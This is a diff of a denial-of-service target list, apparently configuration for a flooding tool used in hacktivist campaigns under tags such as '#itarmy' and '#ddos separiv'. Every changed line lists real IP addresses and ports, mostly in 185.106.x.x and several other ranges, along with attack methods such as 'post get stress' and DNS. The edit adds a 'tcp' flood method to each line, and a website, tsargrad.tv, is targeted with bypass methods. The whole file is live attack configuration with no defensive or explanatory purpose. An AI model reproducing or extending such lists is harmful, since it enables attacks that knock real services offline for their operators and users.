@@ -7,27 +7,27 @@ https://tsargrad.tv/ http://tsargrad.tv/ --http-methods bypass cfb dgb
 
 #itarmy
 
-tcp://185.106.172.117:53 tcp://185.106.172.117:80 tcp://185.106.173.65:80 tcp://185.106.175.213:443 --http-methods post get stress
+tcp://185.106.172.117:53 tcp://185.106.172.117:80 tcp://185.106.173.65:80 tcp://185.106.175.213:443 --http-methods post get stress tcp
 
-tcp://185.106.175.109:80 tcp://185.106.175.72:80 tcp://185.106.175.108:80 tcp://185.106.173.70:80 --http-methods post get stress
+tcp://185.106.175.109:80 tcp://185.106.175.72:80 tcp://185.106.175.108:80 tcp://185.106.173.70:80 --http-methods post get stress tcp
 
-tcp://185.106.173.69:80 tcp://185.106.173.130:80 tcp://185.106.173.130:443 tcp://185.106.173.137:80 --http-methods post get stress
+tcp://185.106.173.69:80 tcp://185.106.173.130:80 tcp://185.106.173.130:443 tcp://185.106.173.137:80 --http-methods post get stress tcp
 
-tcp://185.106.175.104:80 tcp://185.106.175.104:443 tcp://185.106.175.76:80 tcp://185.106.175.74:80 --http-methods post get stress 
+tcp://185.106.175.104:80 tcp://185.106.175.104:443 tcp://185.106.175.76:80 tcp://185.106.175.74:80 --http-methods post get stress tcp
 
-tcp://185.106.175.79:80 tcp://185.106.175.79:443 tcp://185.106.175.214:80 tcp://185.106.175.214:443 tcp://185.106.175.213:80 --http-methods post get stress
+tcp://185.106.175.79:80 tcp://185.106.175.79:443 tcp://185.106.175.214:80 tcp://185.106.175.214:443 tcp://185.106.175.213:80 --http-methods post get stress tcp
 
-tcp://185.106.173.129:80 tcp://185.106.173.129:1025 tcp://185.106.175.148:80 tcp://185.106.175.138:80 --http-methods post get stress 
+tcp://185.106.173.129:80 tcp://185.106.173.129:1025 tcp://185.106.175.148:80 tcp://185.106.175.138:80 --http-methods post get stress tcp
 
-tcp://185.106.175.149:80 tcp://185.106.175.140:80 tcp://185.106.175.141:80 tcp://185.106.175.142:80 --http-methods post get stress 
+tcp://185.106.175.149:80 tcp://185.106.175.140:80 tcp://185.106.175.141:80 tcp://185.106.175.142:80 --http-methods post get stress tcp
 
-tcp://185.106.175.143:80 tcp://185.106.175.144:80 tcp://185.106.175.145:80 tcp://185.106.175.147:80 --http-methods post get stress
+tcp://185.106.175.143:80 tcp://185.106.175.144:80 tcp://185.106.175.145:80 tcp://185.106.175.147:80 --http-methods post get stress tcp
 
-tcp://185.106.172.116:80 tcp://185.106.172.115:80 tcp://185.106.172.114:80 tcp://185.106.175.105:80 --http-methods post get stress
+tcp://185.106.172.116:80 tcp://185.106.172.115:80 tcp://185.106.172.114:80 tcp://185.106.175.105:80 --http-methods post get stress tcp
 
 #ddos separiv
 
-tcp://92.223.100.53:53 tcp://92.223.77.53:53 --http-methods DNS
+tcp://92.223.100.53:53 tcp://92.223.77.53:53 --http-methods DNS tcp
 
 
 
@@ -35,9 +35,9 @@ tcp://92.223.100.53:53 tcp://92.223.77.53:53 --http-methods DNS
 
 #cyberspace
 
-tcp://178.248.232.33:80 tcp://178.248.232.33:443 tcp://185.179.146.43:443 tcp://178.213.78.4:443 --http-methods post get stress
+tcp://178.248.232.33:80 tcp://178.248.232.33:443 tcp://185.179.146.43:443 tcp://178.213.78.4:443 --http-methods post get stress tcp
 
-tcp://84.201.156.231:80 tcp://84.201.156.231:443 tcp://94.124.195.43:80 tcp://94.124.195.43:443 tcp://178.213.78.4:80 --http-methods post get stress
+tcp://84.201.156.231:80 tcp://84.201.156.231:443 tcp://94.124.195.43:80 tcp://94.124.195.43:443 tcp://178.213.78.4:80 --http-methods post get stress tcp
 
 
 
